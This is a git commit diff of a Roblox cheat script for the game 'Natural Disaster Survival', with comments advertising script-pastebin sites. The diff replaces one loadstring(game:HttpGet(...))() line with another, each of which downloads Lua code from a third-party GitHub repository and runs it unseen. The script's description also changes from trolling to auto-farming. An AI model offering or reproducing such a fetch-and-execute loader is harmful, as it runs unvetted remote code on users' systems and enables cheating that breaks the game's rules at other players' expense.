4ec822df87d5dbec54b3873ec7d6139637b413f5
PapaJoeX <jaouad.kassaoui@gmail.com>
2022-12-25 23:38:27 +0100

    commit zero

--- LINK GAME Script pastebin roblox Natural Disaster Survival .lua
+++ LINK GAME Script pastebin roblox Natural Disaster Survival .lua
@@ -1,11 +1,11 @@
 -- find more powerfull verified and New Scripts here : https://script-pastebin.com
 
-loadstring(game:HttpGet(("https://raw.githubusercontent.com/Yarik312/DarkWare/main/MainLoader"), true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/garfield%20hub", true))()
 
 -- find more powerfull verified and New Scripts here : https://scriptpastebin.io
 
 --[[ Script Description:
 
-							Script for trolling or just playing in this place!
+							Script for auto-farming for this game!
 						
 ]]
